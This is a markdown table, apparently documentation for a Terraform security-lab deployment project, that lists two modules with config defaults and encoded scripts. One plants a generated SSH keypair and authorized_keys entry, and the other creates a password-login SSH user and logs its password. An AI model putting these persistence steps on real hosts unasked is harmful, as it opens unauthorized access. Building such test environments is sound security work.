| ModuleName                                                                 | Source                                                         | Tag                                        | ConfigPath                                                                | ConfigOptionsDefault                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | PayloadPath                                                                                                                    | Payload                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
|:---------------------------------------------------------------------------|:---------------------------------------------------------------|:-------------------------------------------|:--------------------------------------------------------------------------|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|:-------------------------------------------------------------------------------------------------------------------------------|:--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| target-ssh-keys                                                            | ./modules/ssm/deploy-ssh-keys                                  | ssm_deploy_secret_ssh_public               | context.aws.ssm.ssh_keys                                                  | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "ssh_keys": {<br/>                    "enabled": false,<br/>                    "ssh_authorized_keys_path": "/home/sshuser/.ssh/authorized_keys",<br/>                    "ssh_private_key_path": "/home/sshuser/.ssh/secret_key",<br/>                    "ssh_public_key_path": "/home/sshuser/.ssh/secret_key.pub"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-keys                                  | <pre>&#35; ssh key<br/>resource &quot;tls&&#35;95;private&&#35;95;key&quot; &quot;ssh&quot; &&#35;123;<br/>  algorithm = &quot;RSA&quot;<br/>  rsa&&#35;95;bits  = &quot;4096&quot;<br/>&&#35;125;<br/><br/>locals &&#35;123;<br/>    ssh&&#35;95;private&&#35;95;key = base64encode&&#35;40;tls&&#35;95;private&&#35;95;key&#46;ssh&#46;private&&#35;95;key&&#35;95;pem&&#35;41;<br/>    ssh&&#35;95;private&&#35;95;key&&#35;95;path = var&#46;inputs&&#35;91;&quot;ssh&&#35;95;private&&#35;95;key&&#35;95;path&quot;&&#35;93;<br/>    ssh&&#35;95;public&&#35;95;key = base64encode&&#35;40;chomp&&#35;40;tls&&#35;95;private&&#35;95;key&#46;ssh&#46;public&&#35;95;key&&#35;95;openssh&&#35;41;&&#35;41;<br/>    ssh&&#35;95;public&&#35;95;key&&#35;95;path = var&#46;inputs&&#35;91;&quot;ssh&&#35;95;public&&#35;95;key&&#35;95;path&quot;&&#35;93;<br/>    ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path = var&#46;inputs&&#35;91;&quot;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&quot;&&#35;93;<br/>    public&&#35;95;key&&#35;95;user = split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;1&&#35;93; == &quot;root&quot; ? &quot;root&quot; : split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;2&&#35;93;<br/>    private&&#35;95;key&&#35;95;user = split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;1&&#35;93; == &quot;root&quot; ? &quot;root&quot; : split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;2&&#35;93;<br/><br/>    payload&&#35;95;public = &lt;&lt;&#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating public key: $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125;&quot;<br/>    log &quot;adding user: $&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;&#46;&#46;&#46;&quot;<br/>    adduser &#45;&#45;gecos &quot;&quot; &#45;&#45;disabled&#45;password &quot;$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;&quot; &#124;&#124; log &quot;$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125; user already exists&quot;<br/>    mkdir &#45;p $&&#35;123;dirname&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;125;<br/>    chown &#45;R $&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;:$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125; $&&#35;123;dirname&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64decode&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;41;&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64decode&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;41;&&#35;125;&&#35;x27; &gt;&gt; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    sort $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125; &#124; uniq &gt; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;&#46;uniq<br/>    mv $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;&#46;uniq $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    chmod 600 $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    chown &#45;R $&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;:$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    log &quot;public key: $&&#35;40;ls &#45;l $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125;&&#35;41;&quot;<br/>    log &quot;authorized key: $&&#35;40;ls &#45;l $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;&&#35;41;&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&&#35;95;payload&&#35;95;public = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;public&&#35;95;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload&&#35;95;public<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    payload&&#35;95;private = &lt;&lt;&#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating private key: $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;&quot;<br/>    log &quot;adding user: $&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125;&#46;&#46;&#46;&quot;<br/>    adduser &#45;&#45;gecos &quot;&quot; &#45;&#45;disabled&#45;password &quot;$&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125;&quot; &#124;&#124; log &quot;$&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125; user already exists&quot;<br/>    mkdir &#45;p $&&#35;123;dirname&&#35;40;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;41;&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64decode&&#35;40;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;41;&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;<br/>    chmod 600 $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;<br/>    chown $&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125;:$&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;<br/>    log &quot;private key: $&&#35;40;ls &#45;l $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;&&#35;41;&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&&#35;95;payload&&#35;95;private = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;private&&#35;95;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload&&#35;95;private<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload&&#35;95;public = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;public&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;public = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;public&&#35;41;<br/>        base64&&#35;95;payload&&#35;95;private = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;private&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;private = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;private&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| target-deploy-ssh-user                                                     | ./modules/ssm/deploy-ssh-user                                  | ssm_deploy_ssh_user                        | context.aws.ssm.ssh_user                                                  | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "ssh_user": {<br/>                    "enabled": false,<br/>                    "password": null,<br/>                    "username": "lou.caloozer"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-user                                  | <pre>locals &&#35;123;<br/>    password = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;password&quot;&&#35;93;&&#35;41;,&quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;password&quot;&&#35;93; :  random&&#35;95;password&#46;password&#46;result<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;Setting up user: $&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125;&quot;<br/>    adduser &#45;&#45;gecos &quot;&quot; &#45;&#45;disabled&#45;password $&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125; &#124;&#124; log &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125; user already exists&quot;<br/>    log &quot;Setting passwd: $&&#35;123;local&#46;password&&#35;125;&quot;<br/>    echo &&#35;x27;$&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125;:$&&#35;123;local&#46;password&&#35;125;&&#35;x27; &#124; chpasswd<br/>    log &quot;Adding user to allowed passwd auth in sshd&&#35;95;config&#46;d&quot;<br/>    cat &gt; /etc/ssh/sshd&&#35;95;config&#46;d/common&#45;user&#45;passwd&#45;auth&#46;conf &lt;&lt;&#45;EOF <br/>    &#35; Configuration to allow key authentication only and display a message on password attempt<br/>    Match User root,admin,test,guest,info,adm,mysql,user,administrator,oracle,ftp,pi,puppet,ansible,ec2&#45;user,vagrant<br/>        AuthenticationMethods publickey<br/>        PasswordAuthentication no<br/>        ForceCommand /bin/echo &&#35;x27;We talked about this guys&#46; No SSH for you&#33;&&#35;x27;<br/>    EOF<br/>    cat &gt; /etc/ssh/sshd&&#35;95;config&#46;d/custom&#45;user&#45;passwd&#45;auth&#46;conf &lt;&lt;&#45;EOF <br/>    Match User $&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125;<br/>        AuthenticationMethods publickey password<br/>        PasswordAuthentication yes<br/>    EOF<br/>    log &quot;Restarting ssh service&quot;<br/>    service ssh reload<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>        password = local&#46;password<br/>    &&#35;125;<br/>&&#35;125;<br/><br/>resource &quot;random&&#35;95;password&quot; &quot;password&quot; &&#35;123;<br/>  length           = 16<br/>  special          = true<br/>  override&&#35;95;special = &quot;&#33;&#35;$%&amp;&&#35;42;&&#35;40;&&#35;41;&#45;&&#35;95;=&#43;&&#35;91;&&#35;93;&&#35;123;&&#35;125;&lt;&gt;:?&quot;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
